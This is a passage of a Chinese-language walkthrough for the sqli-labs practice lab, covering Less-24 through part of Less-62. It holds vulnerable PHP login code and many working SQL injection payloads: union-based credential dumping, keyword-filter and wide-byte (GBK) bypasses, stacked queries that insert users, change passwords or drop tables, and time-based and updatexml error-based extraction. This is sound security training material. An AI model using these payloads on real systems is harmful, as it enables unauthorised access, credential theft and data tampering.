</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">sqllogin</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$username</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_user&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$password</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_password&#34;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You tried to be real smart, Try harder!!!! :( &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysql_fetch_row</span><span class="p">(</span><span class="nv">$res</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$login</span> <span class="o">=</span> <span class="nx">sqllogin</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$login</span><span class="o">==</span> <span class="mi">0</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$login</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;Auth&#34;</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location: logged-in.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>在<code>pass_change.php</code>中</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$username</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$curr_pass</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;current_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$pass</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$re_pass</span><span class="o">=</span><span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET PASSWORD=&#39;</span><span class="si">$pass</span><span class="s2">&#39; where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$curr_pass</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以得知<code>$_SESSION[&quot;username&quot;]</code>来源于数据库的查询结果,并没有经过转义处理,因此通过构造特殊的用户名即可达成二次注入</p>
<h3 id="less-25">Less-25</h3>
<blockquote>
<p><code>and</code>和<code>or</code>被过滤</p>
</blockquote>
<p>传入<code>?id=-1' union select 1,2,'3</code>成功闭合</p>
<p>传入<code>?id=-1' union select 1,(select group_concat(username) from users),'3</code>得到用户名</p>
<p>但是<code>password</code>中存在<code>or</code>被过滤</p>
<p>传入<code>?id=-1' union select 1,(select group_concat(password) from users),'3</code>,返回<code>-1' union select 1,(select group_concat(passwd) from users),'3</code></p>
<p>推测存在关键词替换进而推测可能存在双写绕过</p>
<p>传入<code>?id=-1' oorr 1=1--%20</code>正常回显,返回结果为<code>-1' or 1=1--</code>,说明存在双写绕过</p>
<p>传入<code>?id=-1' union select 1,(select group_concat(passwoorrd) from users),'3</code>得到密码</p>
<h3 id="less-25a">Less-25a</h3>
<p>与Less-25但不用进行闭合</p>
<p>传入<code>?id=-1 union select 1,(select group_concat(username) from users),3</code>得到用户名</p>
<p>传入<code>?id=-1 union select 1,(select group_concat(passwoorrd) from users),3</code>得到密码</p>
<h3 id="less-26">Less-26</h3>
<p>传入<code>?id=-1////oorr****+++---******1=1</code>返回<code>1or1=1</code></p>
<p>注释符被过滤,可以使用<code>%a0</code>代替</p>
<p>传入<code>?id=0'%a0oorr%a0'1'='1</code>正常回显,返回<code>0'�or�'1'='1</code></p>
<p>传入<code>?id=0'%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),'3</code>得到用户名</p>
<p>传入<code>?id=0'%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),'3</code>得到密码</p>
<h3 id="less-26a">Less-26a</h3>
<p>闭合方式改为<code>')</code></p>
<p>传入<code>?id=0')%a0oorr%a0'1'=('1</code>正常回显,返回<code>0'�or�'1'='1</code></p>
<p>传入<code>?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3</code>得到用户名</p>
<p>传入<code>?id=0')%a0union%a0select%a01,(select%a0group_concat(passwoorrd)%a0from%a0users),('3</code>得到密码</p>
<h3 id="less-27">Less-27</h3>
<p><code>union</code>被过滤,使用双写绕过<code>ununionion</code></p>
<p><code>select</code>被过滤,使用双写+大写绕过<code>selSelectect</code></p>
<p>传入<code>?id=0'%a0or%a0'1'='1</code>正常回显,返回<code>0'�or�'1'='1</code></p>
<p>传入<code>?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(username)%a0from%a0users),'3</code>得到用户名</p>
<p>传入<code>?id=0'%a0ununionion%a0seSelectlect%a01,(seSelectlect%a0group_concat(password)%a0from%a0users),'3</code>得到密码</p>
<h3 id="less-27a">Less-27a</h3>
<p>闭合方式改为<code>&quot;</code></p>
<h3 id="less-28">Less-28</h3>
<p>闭合方式为<code>')</code>仅对注释符进行过滤</p>
<p>传入<code>?id=0')%a0union%a0select%a01,(select%a0group_concat(username)%a0from%a0users),('3</code>得到用户名</p>
<p>传入<code>?id=0')%a0union%a0select%a01,(select%a0group_concat(password)%a0from%a0users),('3</code>得到密码</p>
<h3 id="less-28a">Less-28a</h3>
<p>同上</p>
<h3 id="less-29">Less-29</h3>
<p>传入<code>?id=-1'/**/union/**/select/**/1,(select/**/group_concat(username)/**/from/**/users),'3</code>得到用户名</p>
<p>传入<code>?id=-1'/**/union/**/select/**/1,(select/**/group_concat(password)/**/from/**/users),'3</code>得到密码</p>
<h3 id="less-30">Less-30</h3>
<p>将闭合方式更换为<code>&quot;</code></p>
<h3 id="less-31">Less-31</h3>
<p>将闭合方式更换为<code>&quot;)</code></p>
<h3 id="less-32">Less-32</h3>
<p>题目中对<code>' &quot; \</code>进行了转义处理(<code>addslashes</code>),转义为<code>\' \&quot; \\</code>,使用宽字节注入进行绕过</p>
<p>mysql在使用GBK编码时,会认为两个字符为一个汉字,例如<code>%c4%e3</code>就是一个汉字(前一个ASCII码要大于128)</p>
<p>假设传入<code>?id=%df'</code>,此时<code>'</code>被转义为<code>\'</code>,因此最终要执行sql查询的的参数为<code>%df\'</code>而mysql将<code>%df\</code>理解为一个汉字,从而让<code>'</code>逃逸出来</p>
<p>传入<code>?id=%df'</code>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''�\'' LIMIT 0,1' at line 1</code>说明成功将<code>'</code>逃逸</p>
<p>传入<code>?id=-1%df' or 1=1%23</code>正常回显</p>
<p>传入<code>?id=-1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273)%23</code>返回列名,此时由于<code>'users'</code>需要用单引号但不能使用宽字节闭合,因此使用16进制代替</p>
<p>传入<code>?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code>得到用户名和密码</p>
<h3 id="less-33">Less-33</h3>
<p>同上</p>
<h3 id="less-34">Less-34</h3>
<p>同样是宽字节注入,使用POST传参</p>
<p>传入<code>uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23&amp;passwd=a&amp;submit=Submit</code>返回用户名和密码</p>
<h3 id="less-35">Less-35</h3>
<p>不需要构造闭合</p>
<p>传入<code>?id=-1 union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code>返回用户名和密码</p>
<h3 id="less-36">Less-36</h3>
<p>题目提示存在<code>mysql_real_escape_string</code></p>
<p><code>mysql_real_escape_string()</code>调用mysql库的函数<code>mysql_real_escape_string</code>,在以下字符前添加反斜杠<code>\x00, \n, \r, \, ', &quot;</code>和<code>\x1a</code></p>
<p>同样可以使用宽字节注入</p>
<p>传入<code>?id=-1%df' union select 1,(select group_concat(username) from users),(select group_concat(password) from users)%23</code>得到用户名和密码</p>
<h3 id="less-37">Less-37</h3>
<p>使用POST传参</p>
<p>传入<code>uname=a%df' union select (select group_concat(username) from users),(select group_concat(password) from users)%23&amp;passwd=a&amp;submit=Submit</code>返回用户名和密码</p>
<h2 id="stacked-injections">Stacked Injections</h2>
<blockquote>
<p>堆叠注入</p>
</blockquote>
<h3 id="less-38">Less-38</h3>
<p>闭合方式为<code>'</code></p>
<p>传入<code>?id=-1' or 1=1;create table wdnmd like uesrs;%23</code>创建新表</p>
<p>传入<code>?id=-1' or 1=1;drop table wdnmd;%23</code>删除表</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085026.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085026.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085026.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085026.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20085026.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20085026.png" /></p>
<p>传入<code>?id=-1' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');%23</code>新建用户</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085514.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085514.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085514.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20085514.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20085514.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20085514.png" /></p>
<h3 id="less-39">Less-39</h3>
<p>不需要进行闭合,其余步骤同上</p>
<h3 id="less-40">Less-40</h3>
<p>闭合方式为<code>')</code>,其余步骤同上</p>
<h3 id="less-41">Less-41</h3>
<p>同Less-39</p>
<h3 id="less-42">Less-42</h3>
<ol>
<li>
<p>同Less-24的二次注入</p>
</li>
<li>
<p>在password中传入<code>123'</code>返回报错信息,password的闭合方式为<code>'</code></p>
</li>
</ol>
<p>在password处填入<code>1' or 1#</code>使用万能密码登录</p>
<p>在password处填入<code>123' or 1=1;insert into users(id,username,password) values(100,'wdnmd','wdnmd');#</code>新建用户</p>
<p>在password处填入<code>123' or 1=1;update users set password='asdf' where username='wdnmd';#</code>修改用户密码</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20093411.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20093411.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20093411.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20093411.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20093411.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20093411.png" /></p>
<h3 id="less-43">Less-43</h3>
<p>password的闭合方式为<code>')</code>,其余步骤同上</p>
<h3 id="less-44">Less-44</h3>
<p>password的闭合方式为<code>'</code>,但是在测试闭合方式时没有报错信息,其余步骤同上</p>
<h3 id="less-45">Less-45</h3>
<p>password的闭合方式为<code>')</code>,但是在测试闭合方式时没有报错信息,其余步骤同上</p>
<h3 id="less-46">Less-46</h3>
<p><code>order by</code>注入,不需要进行闭合</p>
<ol>
<li>利用<code>rand</code>进行注入</li>
</ol>
<p><code>select * from users order by rand(0);</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095858.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095858.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095858.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095858.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20095858.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20095858.png" /></p>
<p><code>select * from users order by rand(1);</code></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095932.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095932.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095932.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs%28%e5%b7%b2%e5%ae%8c%e6%88%90%29/%e5%b1%8f%e5%b9%95%e6%88%aa%e5%9b%be%202021-11-03%20095932.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20095932.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/huaQ@master/%E9%9D%B6%E5%9C%BA/sqli-labs(已完成)/屏幕截图%202021-11-03%20095932.png" /></p>
<p>例如<code>select * from users order by rand(length(database())=8);</code>可以根据回显数据排序的方式的不同来判断<code>database</code>名称的长度</p>
<p><code>select * from users order by rand(ascii(substr((select group_concat(username) from users),1,1))&lt;50);</code>二分法确定名字</p>
<ol start="2">
<li>利用<code>if</code>进行延时注入</li>
</ol>
<p><code>select * from users order by (if(ascii(substr((select group_concat(username) from users),1,1))&gt;100,1,sleep(0.1)));</code></p>
<p>如果<code>group_concat(username)</code>的首字母的ascii值大于100,则在正常时间内返回结果,如果不大于100,则会延迟一段时间(该时间并不直接等于<code>sleep(0.1)</code>,而是与其查询的数据的条目数量相关,<code>延迟时间 = sleeptime * number</code>)</p>
<ol start="3">
<li>利用<code>updatexml</code>等进行报错注入</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">order</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">20</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">ERROR</span><span class="w"> </span><span class="mi">1105</span><span class="w"> </span><span class="p">(</span><span class="n">HY000</span><span class="p">):</span><span class="w"> </span><span class="n">XPATH</span><span class="w"> </span><span class="n">syntax</span><span class="w"> </span><span class="n">error</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;~information_schema,c~&#39;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="less-47">Less-47</h3>
<p><code>order by</code>注入,闭合方式为<code>'</code></p>
<p>可以使用<code>if</code>进行延时注入,也可以使用<code>updatexml</code>等进行报错注入</p>
<h3 id="less-48">Less-48</h3>
<p><code>order by</code>注入,不需要进行闭合</p>
<p>可以使用<code>if</code>进行延时注入,也可以使用<code>rand</code>等进行注入</p>
<h3 id="less-49">Less-49</h3>
<p><code>order by</code>注入,闭合方式为<code>'</code></p>
<p>可以使用<code>if</code>进行延时注入</p>
<h3 id="less-50">Less-50</h3>
<p><code>order by</code>注入,不需要进行闭合,同时也可以使用堆叠注入</p>
<p>可以使用<code>rand</code>,<code>if</code>,<code>updatexml</code>进行注入</p>
<h3 id="less-51">Less-51</h3>
<p><code>order by</code>注入,闭合方式为<code>'</code>,同时也可以使用堆叠注入</p>
<p>可以使用<code>if</code>,<code>updatexml</code>进行注入</p>
<h3 id="less-52">Less-52</h3>
<p><code>order by</code>注入,不需要进行闭合,同时也可以使用堆叠注入</p>
<p>可以使用<code>rand</code>,<code>if</code>进行注入</p>
<h3 id="less-53">Less-53</h3>
<p><code>order by</code>注入,闭合方式为<code>'</code>,同时也可以使用堆叠注入</p>
<p>可以使用<code>if</code>,<code>updatexml</code>进行注入</p>
<h2 id="challenges">Challenges</h2>
<h3 id="less-54">Less-54</h3>
<p>在10次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得到闭合方式为<code>'</code>,同时没有报错信息</p>
</li>
<li>
<p>判断列数,一共有3列<code>?id=1' order by 3--%20</code></p>
</li>
<li>
<p><code>?id=-1' union select 1,2,3--%20</code>只有<code>2,3</code>列正常回显</p>
</li>
<li>
<p><code>?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())--%20</code>获取表名</p>
</li>
<li>
<p><code>?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='GFTILUL21Y')--%20</code>获取列名</p>
</li>
<li>
<p><code>?id=-1' union select 1,(select group_concat(id) from GFTILUL21Y),(select group_concat(sessid) from GFTILUL21Y)--%20</code>获取<code>id</code>和<code>sessid</code></p>
</li>
<li>
<p><code>?id=-1' union select 1,(select group_concat(secret_ZHH9) from GFTILUL21Y),(select group_concat(tryy) from GFTILUL21Y)--%20</code>获取<code>secret_ZHH9</code>和<code>tryy</code></p>
</li>
</ol>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png"
        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png 2x"
        data-sizes="auto"
        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png"
        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202111051519257.png" /></p>
<h3 id="less-55">Less-55</h3>
<p>在14次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得到闭合方式为<code>)</code>,同时没有报错信息</p>
</li>
<li>
<p>其余方式同上</p>
</li>
</ol>
<h3 id="less-56">Less-56</h3>
<p>length(database())=10
在14次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得到闭合方式为<code>')</code>,同时没有报错信息</p>
</li>
<li>
<p>其余方式同上</p>
</li>
</ol>
<h3 id="less-57">Less-57</h3>
<p>在14次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得到闭合方式为<code>&quot;</code>,同时没有报错信息</p>
</li>
<li>
<p>其余方式同上</p>
</li>
</ol>
<h3 id="less-58">Less-58</h3>
<p>在5次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得到闭合方式为<code>'</code>,传入<code>1'</code>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></p>
</li>
<li>
<p>传入<code>?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(table_name),1,20) from information_schema.tables where table_schema=database()),0x7e),1)--%20</code>返回表名</p>
</li>
<li>
<p>传入<code>?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(column_name),1,30) from information_schema.columns where table_name='DIJZ7NA09S'),0x7e),1)--%20</code>返回列名</p>
</li>
</ol>
<p><code>select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database())</code></p>
<ol start="4">
<li>传入<code>?id=1' and updatexml(1,concat(0x7e,(select substr(group_concat(secret_6WHE),1,30) from DIJZ7NA09S),0x7e),1)--%20</code>得到密钥</li>
</ol>
<h3 id="less-59">Less-59</h3>
<p>在5次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,得知不需要进行闭合,传入<code>1'</code>返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
<h3 id="less-60">Less-60</h3>
<p>在5次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=1&quot;</code>,返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;1&quot;&quot;) LIMIT 0,1' at line 1</code>,可知闭合方式为<code>&quot;)</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
<h3 id="less-61">Less-61</h3>
<p>在5次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=1'</code>,返回<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')) LIMIT 0,1' at line 1</code>,可知闭合方式为<code>'))</code></p>
</li>
<li>
<p>其余同上</p>
</li>
</ol>
<h3 id="less-62">Less-62</h3>
<p>在130次测试中获取到密钥</p>
<ol>
<li>
<p>判断闭合方式,传入<code>?id=-1') or 1=1%23</code>,正常回显,闭合方式为<code>')</code></p>
</li>
<li>
<p>获取<code>database</code>长度,<code>?id=-1') or length(database())=10%23</code></p>
</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
